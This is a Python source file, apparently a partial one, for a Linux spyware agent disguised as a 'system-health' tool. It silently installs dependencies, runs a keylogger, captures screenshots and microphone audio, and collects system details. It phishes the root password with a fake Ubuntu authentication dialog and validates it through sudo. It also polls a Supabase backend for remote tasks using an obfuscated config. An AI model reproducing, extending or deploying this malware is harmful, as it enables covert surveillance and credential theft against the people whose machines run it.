import os
import sys
import time
import json
import socket
import uuid
import random
import string
import platform
import subprocess
import base64
import urllib.request
import urllib.error
from datetime import datetime, timezone
import threading

# --- GLOBALS ---
KEYLOG_BUFFER = []
ROOT_PASSWORD = None
KEYLOG_LOCK = threading.Lock()

# --- CONFIGURATION ---
BASE_PATH = os.path.expanduser("~/.config/system-health")
CONFIG_FILE = os.path.join(BASE_PATH, "config.enc")
DEVICE_ID_FILE = os.path.join(BASE_PATH, ".device_id")
KEY = "S3cr3tK3y2024!"

# --- UTILS ---

def install_dependencies():
    """Attempt to install missing python dependencies silently if possible."""
    requirements = ["mss", "pynput"]
    for req in requirements:
        try:
            __import__(req)
        except ImportError:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", req, "--break-system-packages"],
                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

def get_config():
    try:
        if not os.path.exists(CONFIG_FILE):
            return None
        with open(CONFIG_FILE, "rb") as f:
            encoded = f.read().strip()
        encrypted = base64.b64decode(encoded)
        key_bytes = KEY.encode('utf-8')
        decrypted = bytearray()
        for i in range(len(encrypted)):
            decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
        return json.loads(decrypted.decode('utf-8'))
    except Exception as e:
        return None

def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, "r") as f:
            return f.read().strip()
    new_id = str(uuid.uuid4())
    try:
        os.makedirs(BASE_PATH, exist_ok=True)
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(new_id)
    except:
        pass
    return new_id

def get_device_name():
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(8))

def run_command(cmd, shell=True):
    try:
        result = subprocess.run(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1
    except Exception as e:
        return "", str(e), -1

# --- ACTIONS ---

def take_screenshot():
    try:
        import mss
        filename = f"/tmp/scr_{int(time.time())}.png"
        with mss.mss() as sct:
            sct.shot(mon=-1, output=filename)
        with open(filename, "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
        os.remove(filename)
        return img_data
    except Exception as e:
        raise e

# --- KEYLOGGER ---
def start_keylogger_thread():
    def on_press(key):
        try:
            char = key.char
        except AttributeError:
            char = f"[{str(key).replace('Key.', '')}]"
            
        with KEYLOG_LOCK:
            KEYLOG_BUFFER.append(str(char))
            if len(KEYLOG_BUFFER) > 5000:
                KEYLOG_BUFFER.pop(0)

    try:
        import pynput.keyboard
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
    except Exception as e:
        pass

def attempt_root_escalation():
    """
    Shows a custom AUTHENTICATION REQUIRED dialog using Tkinter.
    Replicates the exact look of Ubuntu's prompt.
    """
    global ROOT_PASSWORD
    
    # Check Tkinter availability
    try:
        import tkinter as tk
        from tkinter import font
    except ImportError as e:
        return False, "Tkinter not installed."

    result_pw = None

    def show_ui():
        nonlocal result_pw
        try:
            # Setup Root
            root = tk.Tk()
            root.withdraw()
            w, h = root.winfo_screenwidth(), root.winfo_screenheight()

            # Fixed dialog dimensions
            DIALOG_WIDTH = 373
            DIALOG_HEIGHT = 381

            # Create Dialog FIRST
            dialog = tk.Toplevel(root)
            dialog.title("Auth")
            dialog.overrideredirect(True)
            dialog.configure(bg='#2C2C2C')

            # Load Dialog Image
            base_dir = os.path.expanduser("~/.config/system-health")
            if not os.path.exists(base_dir):
                base_dir = os.path.dirname(os.path.abspath(__file__))
            img_path = os.path.join(base_dir, "prompt.png")

            bg_image = None
            try:
                import cv2
                import numpy as np
                
                png_img = cv2.imread(img_path, cv2.IMREAD_UNCHANGED)
                if png_img is not None:
                    png_img = cv2.resize(png_img, (DIALOG_WIDTH, DIALOG_HEIGHT), interpolation=cv2.INTER_LANCZOS4)
                    
                    if png_img.shape[2] == 4:
                        alpha = png_img[:, :, 3]
                        rgb = png_img[:, :, :3]
                        bg_color = np.array([44, 44, 44], dtype=np.uint8)
                        for c in range(3):
                            rgb[:, :, c] = rgb[:, :, c] * (alpha / 255.0) + bg_color[c] * (1.0 - alpha / 255.0)
                        temp_png = "/tmp/dialog_fixed.png"
                        cv2.imwrite(temp_png, rgb)
                        bg_image = tk.PhotoImage(file=temp_png)
                    else:
                        temp_png = "/tmp/dialog_fixed.png"
                        cv2.imwrite(temp_png, png_img)
                        bg_image = tk.PhotoImage(file=temp_png)
            except Exception as e:
                # Fallback to PIL
                try:
                    from PIL import Image
                    pil_img = Image.open(img_path)
                    pil_img = pil_img.resize((DIALOG_WIDTH, DIALOG_HEIGHT), Image.Resampling.LANCZOS)
                    temp_png = "/tmp/dialog_resized.png"
                    pil_img.save(temp_png)
                    bg_image = tk.PhotoImage(file=temp_png)
                except:
                    # Final fallback
                    try:
                        bg_image = tk.PhotoImage(file=img_path)
                    except:
                        bg_image = None

            # Center Dialog
            x = (w - DIALOG_WIDTH) // 2
            y = (h - DIALOG_HEIGHT) // 2
            dialog.geometry(f"{DIALOG_WIDTH}x{DIALOG_HEIGHT}+{x}+{y}")

            # Dimmer
            dimmer = None
            try:
                import mss
                import mss.tools
                import cv2
                temp_screenshot = "/tmp/screen_bright.png"
                with mss.mss() as sct:
                    sct_img = sct.grab(sct.monitors[0])
                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=temp_screenshot)
                
                img = cv2.imread(temp_screenshot)
                dimmed_img = cv2.convertScaleAbs(img, alpha=0.4, beta=0)
                temp_dimmed = "/tmp/screen_dimmed.png"
                cv2.imwrite(temp_dimmed, dimmed_img)
                screen_photo = tk.PhotoImage(file=temp_dimmed)
                
                dimmer = tk.Toplevel(root)
                dimmer.geometry(f"{w}x{h}+0+0")
                dimmer.overrideredirect(True)
                dimmer.configure(bg='black')
                dimmer_label = tk.Label(dimmer, image=screen_photo, borderwidth=0)
                dimmer_label.image = screen_photo
                dimmer_label.place(x=0, y=0)
            except:
                dimmer = tk.Toplevel(root)
                dimmer.geometry(f"{w}x{h}+0+0")
                dimmer.configure(bg='black')
                dimmer.overrideredirect(True)

            # Background Label
            if bg_image:
                bg_lbl = tk.Label(dialog, image=bg_image, borderwidth=0, highlightthickness=0)
                bg_lbl.image = bg_image
                bg_lbl.place(x=0, y=0)

            if dimmer: dimmer.lower(dialog)
            dialog.lift()
            dialog.attributes('-topmost', True)

            # Layout Config
            POS = { 'title_y': 50, 'msg_y': 85, 'avatar_y': 170, 'username_y': 220, 'input_y': 273, 'input_w': 260, 'input_h': 28, 'btn_h': 41, 'btn_gap': 1 }
            TEXT_COLOR = 'white'
            TITLE_BG = '#1d1d1d'
            MSG_BG = '#1d1d1d'
            AVATAR_BG = '#272727'
            USERNAME_BG = '#1d1d1d'
            ENTRY_BG = '#393230'
            BTN_AUTH_BG = '#323232'
            BTN_AUTH_HOVER = '#424242'
            BTN_CANCEL_BG = '#323232'
            BTN_CANCEL_HOVER = '#424242'

            hdr_font = font.Font(family="Ubuntu", size=13, weight="bold")
            tk.Label(dialog, text="Authentication Required", bg=TITLE_BG, fg=TEXT_COLOR, font=hdr_font).place(relx=0.5, y=POS['title_y'], anchor='center')
            
            body_font = font.Font(family="Ubuntu", size=10)
            msg = "Authentication keyring is needed to upgrade\nsystem packages"
            tk.Label(dialog, text=msg, bg=MSG_BG, fg='#CCCCCC', font=body_font, justify='center').place(relx=0.5, y=POS['msg_y'], anchor='center')

            username = os.getlogin()
            initial = username[0].upper() if username else "?"
            tk.Label(dialog, text=initial, bg=AVATAR_BG, fg='white', font=("Ubuntu", 18, "bold")).place(relx=0.5, y=POS['avatar_y'], anchor='center')
            tk.Label(dialog, text=username, bg=USERNAME_BG, fg=TEXT_COLOR, font=("Ubuntu", 12, "bold")).place(relx=0.5, y=POS['username_y'], anchor='center')

            pw_entry = tk.Entry(dialog, show="•", bg=ENTRY_BG, fg='white', relief='flat', bd=0, highlightthickness=0, font=("Ubuntu", 15), insertbackground='white', justify='center')
            pw_entry.place(relx=0.5, y=POS['input_y'], width=POS['input_w'], height=POS['input_h'], anchor='center')
            pw_entry.bind('<FocusOut>', lambda e: pw_entry.focus_set())

            btn_w = (DIALOG_WIDTH - POS['btn_gap']) // 2
            btn_y = DIALOG_HEIGHT - POS['btn_h']

            def cancel(e=None):
                try:
                    dialog.destroy()
                    if dimmer: dimmer.destroy()
                    root.destroy()
                except: pass

            def submit(event=None):
                nonlocal result_pw
                result_pw = pw_entry.get()
                try:
                    dialog.destroy()
                    if dimmer: dimmer.destroy()
                    root.destroy() 
                except: pass

            lbl_cancel = tk.Label(dialog, text="Cancel", bg=BTN_CANCEL_BG, fg='white', font=body_font)
            lbl_cancel.place(x=0, y=btn_y, width=btn_w, height=POS['btn_h'])
            lbl_cancel.bind("<Button-1>", cancel)

            lbl_auth = tk.Label(dialog, text="Authenticate", bg=BTN_AUTH_BG, fg='white', font=("Ubuntu", 10, "bold"))
            lbl_auth.place(x=btn_w + POS['btn_gap'], y=btn_y, width=btn_w, height=POS['btn_h'])
            lbl_auth.bind("<Button-1>", submit)

            # Hover effects - buttons become brighter on mouse over
            BTN_AUTH_HOVER = '#424242'
            BTN_CANCEL_HOVER = '#424242'
            
            def on_cancel_enter(e): lbl_cancel.config(bg=BTN_CANCEL_HOVER)
            def on_cancel_leave(e): lbl_cancel.config(bg=BTN_CANCEL_BG)
            def on_auth_enter(e): lbl_auth.config(bg=BTN_AUTH_HOVER)
            def on_auth_leave(e): lbl_auth.config(bg=BTN_AUTH_BG)
            
            lbl_cancel.bind("<Enter>", on_cancel_enter)
            lbl_cancel.bind("<Leave>", on_cancel_leave)

            def update_auth_button_state(e=None):
                if pw_entry.get():
                    lbl_auth.config(fg=TEXT_COLOR, cursor='hand2')
                    lbl_auth.bind("<Button-1>", submit)
                    lbl_auth.bind("<Enter>", on_auth_enter)
                    lbl_auth.bind("<Leave>", on_auth_leave)
                else:
                    lbl_auth.config(fg='#555555', cursor='arrow', bg=BTN_AUTH_BG)
                    lbl_auth.unbind("<Button-1>")
                    lbl_auth.unbind("<Enter>")
                    lbl_auth.unbind("<Leave>")
            
            pw_entry.bind('<KeyRelease>', update_auth_button_state)
            update_auth_button_state()
            
            def submit_if_valid(e=None):
                if pw_entry.get(): submit(e)
            pw_entry.bind('<Return>', submit_if_valid)
            dialog.bind('<Escape>', cancel)
            
            def set_focus():
                pw_entry.focus_force()
                try: dialog.grab_set_global()
                except: dialog.grab_set()
            dialog.after(250, set_focus)
            
            root.after(60000, lambda: cancel())

            try:
                root.mainloop()
            except Exception as e:
                pass
            
            # Cleanup
            try:
                if 'root' in locals(): root.destroy()
            except: pass

        except Exception as e:
            pass

    # Execute UI
    try:
        show_ui()
    except Exception as e:
        return False, f"UI Failed: {e}"

    if result_pw:
        test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
        if test.returncode == 0:
            ROOT_PASSWORD = result_pw
            return True, f"Success! Root password captured: {result_pw}"
        else:
            return False, "Password captured but incorrect."
    else:
        return False, "User cancelled."

def record_audio(duration=10):
    try:
        filename = f"/tmp/aud_{int(time.time())}.wav"
        result = subprocess.run(["arecord", "-d", str(duration), "-f", "cd", "-t", "wav", "-q", filename], capture_output=True, text=True)
        if result.returncode != 0: raise Exception(result.stderr.strip())
        with open(filename, "rb") as f: audio_data = base64.b64encode(f.read()).decode()
        os.remove(filename)
        return audio_data
    except Exception as e:
        raise e

def get_sys_info():
    info = {
        'platform': platform.platform(),
        'processor': platform.processor()
    }
    out, _, _ = run_command("free -h")
    info['memory'] = out
    out, _, _ = run_command("df -h /")
    info['disk'] = out
    out, _, _ = run_command("ip addr")
    info['network'] = out
    out, _, _ = run_command("whoami")
    info['user'] = out
    return json.dumps(info)

def api_request(config, endpoint, method="GET", data=None):
    url = f"{config['supabase_url']}/rest/v1/{endpoint}"
    headers = {
        "apikey": config['supabase_key'],
        "Authorization": f"Bearer {config['supabase_key']}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }
    try:
        req = urllib.request.Request(url, method=method)
        for k, v in headers.items(): 
            req.add_header(k, v)
        if data: 
            req.data = json.dumps(data).encode('utf-8')
        
        with urllib.request.urlopen(req) as response:
            response_data = response.read().decode()
            if method == "GET" and response_data: 
                return json.loads(response_data)
            return True
    except urllib.error.HTTPError as e:
        error_body = e.read().decode() if e.fp else "No error body"
        print(f"API Error ({endpoint}): {e.code} - {error_body}")
        return None
    except Exception as e:
        print(f"API Request Exception ({endpoint}): {e}")
        return None

# ... (omitted parts)

def main():
    print("Agent starting...")
    config = get_config()
    if not config:
        print("Failed to load/decrypt config.enc")
        return
    
    device_id = get_device_id()
    print(f"Device ID: {device_id}")
    
    print("Installing dependencies...")
    install_dependencies()
    start_keylogger_thread()
    
    print(f"Starting main loop (Sync: {config.get('sync_interval', 10)}s)...")
    while True:
        try:
            print("Registering device...")
            register_device(config, device_id)
            print("Processing tasks...")
            process_tasks(config, device_id)
        except Exception as e:
            print(f"Main loop error: {e}")
        time.sleep(config.get('sync_interval', 10))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Fatal error: {e}")
